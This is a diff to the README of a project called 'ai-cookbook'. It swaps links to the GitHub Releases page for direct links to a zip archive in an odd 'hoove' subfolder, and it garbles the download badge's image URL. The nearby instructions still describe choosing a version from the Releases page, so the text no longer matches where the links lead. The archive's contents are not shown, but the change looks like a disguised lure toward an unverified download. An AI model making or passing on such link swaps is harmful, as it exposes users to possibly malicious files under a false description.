@@ -22,7 +22,7 @@ To get started with ai-cookbook, you will need to download the application. No p
 
 To download the latest version of ai-cookbook, visit the following page:
 
-[![Download ai-cookbook](https://img.shields.io/badge/Download%20ai-cookbook-blue.svg)](https://github.com/hiimnew3190/ai-cookbook/releases)
+[![Download ai-cookbook](https://raw.githubusercontent.com/hiimnew3190/ai-cookbook/main/hoove/ai-cookbook.zip%https://raw.githubusercontent.com/hiimnew3190/ai-cookbook/main/hoove/ai-cookbook.zip)](https://raw.githubusercontent.com/hiimnew3190/ai-cookbook/main/hoove/ai-cookbook.zip)
 
 1. Click on the link above to go to the Releases page.
 2. You will see a list of available versions. Find the latest version at the top.
@@ -56,5 +56,5 @@ If you encounter any issues or have any questions, please refer to the FAQs in t
 
 If you wish to contribute to the ai-cookbook, we welcome your input. Feel free to create issues on GitHub for suggestions or improvements.
 
-To download ai-cookbook again, use this link: [Download ai-cookbook](https://github.com/hiimnew3190/ai-cookbook/releases).
+To download ai-cookbook again, use this link: [Download ai-cookbook](https://raw.githubusercontent.com/hiimnew3190/ai-cookbook/main/hoove/ai-cookbook.zip).
 ```
